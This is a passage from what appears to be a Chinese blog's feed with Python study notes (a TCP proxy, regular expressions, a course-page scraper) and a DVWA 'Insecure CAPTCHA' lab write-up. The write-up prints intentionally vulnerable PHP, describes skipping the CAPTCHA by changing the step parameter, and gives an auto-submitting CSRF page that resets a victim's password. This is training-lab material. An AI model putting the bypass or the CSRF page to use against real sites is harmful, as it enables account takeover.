class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Server</span><span class="params">(LPORT,CHOST,CPORT)</span>:</span></span><br><span class="line">    c = Client(CHOST,CPORT)</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'localhost'</span>,LPORT))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">        sock.send(str.encode(<span class="string">'Welcome to TCPProxy!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> bytes.decode(cmd) == <span class="string">'exit'</span>:</span><br><span class="line">                print(<span class="string">'TCPClient '</span>+addr+<span class="string">' has lost'</span>)</span><br><span class="line">                Forward(c,cmd)</span><br><span class="line">                c.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The command from TCPClient is: '</span>+bytes.decode(cmd))</span><br><span class="line">            result = Forward(c,cmd)</span><br><span class="line">            print(<span class="string">'The result from TCPServer is: '</span>+bytes.decode(result))</span><br><span class="line">            sock.send(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Client</span><span class="params">(CHOST,CPORT)</span>:</span></span><br><span class="line">    c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    c.connect((CHOST,CPORT))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Forward</span><span class="params">(c,cmd)</span>:</span></span><br><span class="line">    c.send(cmd)</span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        LPORT = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">        CHOST = sys.argv[<span class="number">2</span>]</span><br><span class="line">        CPORT = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">        Server(LPORT,CHOST,CPORT)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="https://Foxgrin.github.io//posts/26030/"/>
    <id>https://Foxgrin.github.io//posts/26030/</id>
    <published>2018-07-21T06:53:00.000Z</published>
    <updated>2018-07-21T14:22:28.172Z</updated>
    
    <content type="html"><![CDATA[<p>好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础<a id="more"></a></p><h2 id="什么是正则"><a href="#什么是正则" class="headerlink" title="什么是正则"></a>什么是正则</h2><p>正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串，简单理解，就是对字符串的检索匹配和处理</p><h2 id="Python-正则表达式"><a href="#Python-正则表达式" class="headerlink" title="Python 正则表达式"></a>Python 正则表达式</h2><p>Python通过re模块提供对正则表达式的支持</p><p>1.先将正则表达式的字符串形式编译为Pattern实例；</p><p>2.使用Pattern实例处理文本并获得匹配结果；</p><p>3.使用实例获得信息，进行其他的操作。</p><p>先熟知几个re模块常用的函数：</p><p>(1)re.compile(pattern,flags=0)</p><p>​    re.match(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">'hello'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = pattern.match(<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(match.group())</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的compile函数生成一个正则表达式的pattern对象，该对象拥有一系列方法用于正则表达式的匹配和替换,简单而言就是规定了匹配的模式，而match函数则用来匹配，匹配成功则返回一个match对象，match对象通过group()返回被RE匹配的字符串</p><p>(2)re.findall(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(<span class="string">'hello'</span>,<span class="string">'hello world'</span>)</span><br><span class="line">[<span class="string">'hello'</span>]</span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的findall函数遍历匹配，可以获取字符串中所有匹配的字符串，返回一个列表，跟compile函数不同在于，findall函数能搜素出所有符合的字符串组成一个列表</p><p>(3)re.search(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">'hello'</span>,<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match.group()</span><br><span class="line"><span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的search函数，跟match函数一样，只找到第一个匹配的字符串然后返回一个match对象</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>抓取i春秋网页的课程信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python正则/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.ichunqiu.com/courses/webaq"</span></span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'www.ichunqiu.com'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url,headers=header)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程名称</span></span><br><span class="line">classname=[]</span><br><span class="line">l=soup.find_all(<span class="string">'div'</span>,class_=<span class="string">'coursename'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    classname.append(i[<span class="string">'title'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程价格</span></span><br><span class="line">cost=re.findall(<span class="string">r'\d*元|免费'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程课时和总时间</span></span><br><span class="line">time=re.findall(<span class="string">r'\d*课时\d*分钟'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程学习人数</span></span><br><span class="line">people=re.findall(<span class="string">r'\d*人学习'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#整理课程所有信息</span></span><br><span class="line">classMessage=[]</span><br><span class="line">message=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    message.append(classname[i])</span><br><span class="line">    message.append(cost[i])</span><br><span class="line">    message.append(time[i])</span><br><span class="line">    message.append(people[i])</span><br><span class="line">    classMessage.append(message)</span><br><span class="line">    message=[]</span><br><span class="line">print(<span class="string">'&#123;0:30s&#125;\t&#123;1:8s&#125;\t&#123;2:15s&#125;\t&#123;3:15s&#125;'</span>.format(<span class="string">'课程名称'</span>,<span class="string">'价格'</span>,<span class="string">'课时及总时间'</span>,<span class="string">'学习人数'</span>,chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classMessage:</span><br><span class="line">    print(<span class="string">'&#123;0:30s&#125;\t&#123;1:8s&#125;\t&#123;2:15s&#125;\t&#123;3:15s&#125;'</span>.format(i[<span class="number">0</span>],i[<span class="number">1</span>],i[<span class="number">2</span>],i[<span class="number">3</span>],chr(<span class="number">12288</span>)))</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python正则/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后这里因为中文英文字符所占字节不同，所以死活对不齐…也利用了chr(12288)填充的办法还是行不通，希望有大神能告知如何解决，感激不尽</p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table><thead><tr><th>一般字符</th><th>匹配自身</th><th>abc</th><th>abc</th></tr></thead><tbody><tr><td>.</td><td>匹配任意换行符”\n”以外的字符</td><td>a.c</td><td>abc</td></tr><tr><td>\</td><td>转义字符，是最后一个字符改变原来的意思。用于在正则表达式中转义一些特殊字符</td><td><code>a\.c</code> <code>a\\c</code></td><td>a.c       a\c</td></tr><tr><td>[…]</td><td>字符集。对应的位置可以是字符串集中任意1个字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]，第一个字符如果是^则表示取反，如<code>[^abc]</code>表示不是abc的其他字符。所有的特殊字符在字符集中都失去原来的特殊含义，在字符集中如果要使用]，-或^，可以在前面加上反斜杠</td><td>a[bcd]e</td><td>abe ace ade</td></tr></tbody></table><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><table><thead><tr><th>预定义字符（可以写在[…]中）</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>\d</td><td>数字：[0-9]</td><td>a\dc</td><td>a1c,a9c</td></tr><tr><td>\D</td><td>非数字：<code>[^\d]</code></td><td>a\Dc</td><td>abc,a c</td></tr><tr><td>\s</td><td>空白字符：[&lt;空格&gt;\t\r\f\v]</td><td>a\sc</td><td>a c</td></tr><tr><td>\S</td><td>非空白字符：<code>[^\s]</code></td><td>a\Sc</td><td>abc,a1c</td></tr><tr><td>\w</td><td>单词字符：[A-Za-z0-9]</td><td>a\wc</td><td>abc,a1c,aBc</td></tr><tr><td>\W</td><td>非单词字符：<code>[^\w]</code></td><td>a\Wc</td><td>a c,a.c</td></tr></tbody></table><h2 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a>数量词</h2><table><thead><tr><th>数量词</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>*</td><td>匹配前一次字符0次或无限次</td><td>abc*</td><td>ab,abccc</td></tr><tr><td>+</td><td>匹配前一个字符1次或无限次</td><td>abc+</td><td>abc,abccc</td></tr><tr><td>?</td><td>匹配前一个字符0次或1次</td><td>abc?</td><td>ab,abc</td></tr><tr><td>{m}</td><td>匹配前一个字符m次</td><td>ab{2}c</td><td>abbc</td></tr><tr><td>{m,n}</td><td>匹配前一个字符m到n次</td><td>ab{1,2}c</td><td>abc,abbc</td></tr></tbody></table><h2 id="逻辑，分组"><a href="#逻辑，分组" class="headerlink" title="逻辑，分组"></a>逻辑，分组</h2><table><thead><tr><th>字符</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>或运算符</td><td>代表左右表达式任意匹配一个，它总是先尝试匹配左边的表达式，一旦成功匹配则跳过右边的表达式，如果或运算符没有包括在()中，则它的范围是整个正则表达式</td><td>abc或def</td><td>abc          def</td></tr><tr><td>(…)</td><td>被括起来的表达式将作为分组，从表达式左边开始每遇到一个分组的左括号，编号+1分组表达式作为一个整体，可以后接数量词，表达式中或运算符仅在该组中有效</td><td>(abc){2}  a(123或456)c</td><td>abcabc a123c,a456c</td></tr></tbody></table><h2 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h2><p>正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，意思是总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符。</p><p>例如：正则表达式”ab*“如果用于查找”abbbc”，将匹配到”abbb”。而如果使用非贪婪方法(在数量词后面加上?，则使用非贪婪方法匹配)，如”ab*?”，将找到”a”</p>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Insecure CAPTCHA</title>
    <link href="https://Foxgrin.github.io//posts/51335/"/>
    <id>https://Foxgrin.github.io//posts/51335/</id>
    <published>2018-07-16T06:10:00.000Z</published>
    <updated>2018-07-16T08:02:16.296Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中关于不安全的验证码的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match? </span><br><span class="line">        if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            // Show next stage for the user </span><br><span class="line">            echo &quot; </span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt; </span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; </span><br><span class="line">                &lt;/form&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Both new passwords do not match. </span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) &#123; </span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check to see if both password match </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with the passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很长，但是我们并不需要所有的代码，关键代码在于服务器的两个执行流程，首先会使用Google提供reCAPTCHA服务，这个服务会产生一个验证码(PS:访问到这个验证码需要翻墙，这里没有翻墙，所以显示不出验证码，但不影响我们的测试)，待用户输入验证码之后调用一个recaptcha_check_answer函数检查用户输入的正确性，该函数具体语法如下：</p><p><em>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</em> </p><p>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。</p><p>若校验成功，服务器会返回一个修改密码的表单，待用户修改密码</p><p>那么就有个疑问，是不是一定要通过输入正确的验证码才能修改得了密码呢，服务器的意思虽然是这样，但是我们仔细观察源代码，发现了一个很关键的参数$_POST[‘step’]，服务器只是根据这个参数的值来分别执行校验和修改密码的两个流程，说到这里，就很明白了，我们只需要修改step的值为2，就能轻松的跳过校验过程，所以说这个验证码是不安全的，或者说这是一个不安全的校验过程</p><p>我们利用burp抓包修改step值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功修改密码为admin</p><p>还可以利用CSRF攻击的原理诱骗受害者访问一个攻击页面，攻击页面伪造请求给服务器修改密码</p><p>攻击页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/captcha/&quot;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>受害者访问攻击页面，最终跳转到修改密码成功的页面，缺点就是会被受害者察觉到密码被修改了</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span 